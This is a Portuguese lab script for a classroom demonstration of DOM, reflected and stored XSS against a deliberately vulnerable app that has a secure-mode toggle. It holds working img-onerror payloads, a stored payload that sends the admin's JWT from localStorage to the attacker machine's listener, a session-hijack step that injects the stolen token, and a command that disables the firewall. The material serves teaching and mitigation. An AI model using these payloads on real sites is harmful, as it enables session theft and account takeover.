# Roteiro Sequencial de Execução: Demonstração de XSS (Atacante com Coletor no Computador 2)

Este roteiro descreve a sequência exata de passos para demonstrar os ataques de XSS (DOM, Refletido e Armazenado) utilizando dois computadores conectados via Hotspot do Computador 1, com o **coletor de credenciais rodando no Computador 2 (Atacante)** e a simulação de pós-exploração (sequestro de sessão).

---

## 🛠️ Definição das Máquinas e Papéis
* **Computador 1 (Servidor / Vítima):** Hospeda os servidores (Frontend e Django) e cria o Hotspot. O Administrador do sistema navega neste computador.
* **Computador 2 (Atacante / Usuário Comum):** Conecta-se ao Hotspot do Computador 1 e acessa a aplicação. O Atacante inicia seu servidor de escuta local nesta máquina.

> [!NOTE]
> **Sobre Usuários no Sistema:**
> Você **não precisa criar outros usuários** além do superuser (`admin`) já criado no Computador 1.
> * O formulário de suporte (`suporte.html`) é público e pode ser preenchido anonimamente pelo Computador 2 (simulando o Atacante).
> * O administrador (`admin`) logado no Computador 1 será a vítima cuja sessão será roubada.

---

## 📅 PASSO 1: Configuração da Rede e Firewall

1. **Ativar o Hotspot no Computador 1 (Servidor):**
   * No Windows do Computador 1, vá em **Configurações > Rede e Internet > Hotspot Móvel** e ative-o.
   * Defina o nome da rede (ex: `AutodefensoresXSS`) e a senha (ex: `12345678`).
   * *(O Windows atribui, por padrão, o IP **`192.168.137.1`** para o Computador 1 nesta rede).*

2. **Conectar o Computador 2:**
   * No Computador 2, conecte-se na rede Wi-Fi criada pelo Computador 1 (`AutodefensoresXSS`).

3. **Descobrir o IP do Computador 2 (Atacante):**
   * No **Computador 2**, abra o PowerShell e execute:
     ```powershell
     ipconfig
     ```
   * Procure por "Adaptador de Rede Sem Fio Wi-Fi" e anote o seu **Endereço IPv4** (Exemplo: `192.168.137.140`). 
   * *Daqui em diante, substitua `[IP_COMPUTADOR_2]` pelo IP que você anotou.*

4. **Desativar o Firewall no Computador 1 (Servidor):**
   * No **Computador 1**, abra o PowerShell como **Administrador** e execute:
     ```powershell
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     ```
     *(Para religá-lo depois: `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True`)*

5. **Validar a Conectividade (do Computador 2 para o Computador 1):**
   * No **Computador 2**, abra o Prompt de Comando (CMD) e digite:
     ```cmd
     ping 192.168.137.1
     ```
   * Certifique-se de que há resposta com sucesso.

---

## 🚀 PASSO 2: Inicialização dos Serviços

### No Computador 1 (Servidor)
Abra **duas janelas separadas do PowerShell** na pasta raiz do projeto e execute os seguintes comandos:

1. **Janela 1: Servidor Frontend (Porta 5500)**
   ```powershell
   venv\Scripts\python.exe -m http.server 5500 --directory frontend
   ```
2. **Janela 2: API Django Backend (Porta 8000)**
   ```powershell
   venv\Scripts\python.exe manage.py runserver 0.0.0.0:8000
   ```

### No Computador 2 (Atacante)
Abra **uma janela do terminal** (qualquer pasta) e inicie o coletor de escuta na porta 8001:
```powershell
python -m http.server 8001
```
*Este comando nativo do Python iniciará um servidor simples de log. Qualquer requisição web enviada a ele será registrada no console.*

---

## 🧪 PASSO 3: Execução dos Testes Práticos (No Computador 2)

No navegador do **Computador 2**, acesse a aplicação:
```text
http://192.168.137.1:5500/
```

### 🔹 Teste 1: DOM-Based XSS (Mensagem no Hash da URL)
1. Defina o Painel de Segurança para o **Modo Vulnerável**.
2. Altere a URL do navegador no Computador 2 adicionando a carga útil:
   ```text
   http://192.168.137.1:5500/#mensagem=<img src=x onerror="alert('DOM XSS Ativo!')">
   ```
3. Pressione **Enter**.
4. **Resultado:** O banner do site interpretará a tag HTML via `innerHTML` e executará o `alert` no navegador.
5. **Mitigação:** Mude para o **Modo Seguro**, recarregue a URL com o mesmo hash e verifique que o código é renderizado inofensivamente como texto puro (usando `textContent`).

### 🔹 Teste 2: Reflected XSS (Mecanismo de Busca)
1. Certifique-se de que a aplicação está no **Modo Vulnerável**.
2. Na barra de pesquisa de peças do catálogo, digite o payload de imagem (pois navegadores modernos não executam tags `<script>` injetadas via `innerHTML`):
   ```html
   <img src=x onerror="alert('Reflected XSS!')">
   ```
3. Pressione a tecla **Enter** no teclado para executar a busca (ou acesse diretamente a URL: `http://192.168.137.1:5500/index.html?q=<img src=x onerror="alert('Reflected XSS!')">`).
4. **Resultado:** O navegador tentará carregar a imagem inexistente "x", falhará e executará imediatamente o evento `onerror`, disparando o `alert`.
5. **Mitigação:** Ative o **Modo Seguro** no painel de segurança e refaça a busca para verificar que a tag inteira é renderizada de forma inofensiva como texto.

### 🔹 Teste 3: Stored XSS + Roubo de Token JWT (Exfiltração de Sessão)

#### Parte A - O Login do Administrador (No Computador 1):
1. No navegador do **Computador 1**, acesse localmente: `http://localhost:5500/`.
2. Faça login com a conta de administrador criada anteriormente (isso salvará o token `access_token` no `localStorage` do Computador 1).
3. Navegue até o painel administrativo: `http://localhost:5500/admin_dashboard.html` (deixe o painel em **Modo Vulnerável**).

#### Parte B - O Envio do Script Invasor (No Computador 2):
1. No navegador do **Computador 2**, acesse a página de suporte ao cliente:
   ```text
   http://192.168.137.1:5500/suporte.html
   ```
2. No campo de **Mensagem** do formulário de suporte, insira o payload espião apontando para o IP do **Computador 2** (Atacante):
   ```html
   Problema urgente! <img src=x onerror="fetch('http://[IP_COMPUTADOR_2]:8001/log?token=' + localStorage.getItem('access_token'))">
   ```
   *(Substitua `[IP_COMPUTADOR_2]` pelo IP que você anotou no Passo 1, Ex: `192.168.137.140`)*
3. Envie o formulário. O chamado contendo o script espião agora está gravado no banco de dados SQLite.

#### Parte C - A Execução e o Roubo (No Computador 1):
1. No navegador do **Computador 1** (onde o administrador está logado na página de administração).
2. Clique no botão de **"Atualizar Chamados"** ou atualize a página.
3. O navegador do administrador carregará a mensagem do banco de dados e executará o script espião silenciosamente em segundo plano.

#### Parte D - Confirmação do Roubo no Computador 2 (Atacante):
1. Volte ao **Computador 2** e observe a janela do terminal onde você executou `python -m http.server 8001`.
2. O log de requisições imprimirá instantaneamente o token JWT do Administrador enviado pelo Computador 1 pela rede Wi-Fi:
   ```text
   192.168.137.1 - - [18/Jun/2026 13:50:00] "GET /log?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1" 404 -
   ```

---

### 🔹 Teste 4: Sequestro de Sessão (Session Hijacking / Pós-Exploração)
Este passo demonstra a utilidade real do token roubado no Teste 3.

1. **Copiar o Token Roubado:**
   * No terminal do **Computador 2**, copie a string completa do token JWT que foi exibida (tudo depois de `token=`).

2. **Simular a Invasão:**
   * No **Computador 2**, abra uma **janela anônima** no navegador.
   * Tente acessar diretamente o painel de administração: `http://192.168.137.1:5500/admin_dashboard.html`.
   * *O sistema mostrará o aviso vermelho de que você não tem permissão.*

3. **Injetar o Token JWT no Navegador:**
   * Pressione **F12** no Computador 2 para abrir a Ferramenta de Desenvolvedor e clique na aba **Console**.
   * Execute o comando a seguir inserindo o token copiado:
     ```javascript
     localStorage.setItem('access_token', 'SUA_STRING_DE_TOKEN_JWT_AQUI')
     ```
   * Pressione **F5** para recarregar a página.

4. **Resultado Visual:**
   * A página carregará sem o aviso de erro e dará **acesso completo à fila de chamados** para o Computador 2, provando o sequestro de sessão administrativo sem conhecer a senha.
